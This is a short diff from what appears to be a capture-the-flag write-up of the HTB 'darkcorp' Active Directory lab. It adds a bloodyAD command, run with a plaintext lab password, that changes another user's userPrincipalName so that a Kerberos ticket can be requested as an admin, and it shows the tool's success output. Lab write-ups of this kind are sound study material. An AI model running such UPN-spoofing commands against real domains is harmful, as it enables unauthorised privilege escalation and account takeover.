@@ -1231,6 +1231,13 @@ This user is now compromised
 Using `john.w` credentials i can see that this user does not have a UPN set, i can set one then request a TGT as the admin user
 
 ```python
+bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u john.w -p 'Pack_Beneath_Solid9!' set object angela.w userPrincipalName -v 'angela.w.adm'
+[+] angela.w's userPrincipalName has been updated
+```
+
+Ill set the UPN of the user
+
+```python
 
 ```
 
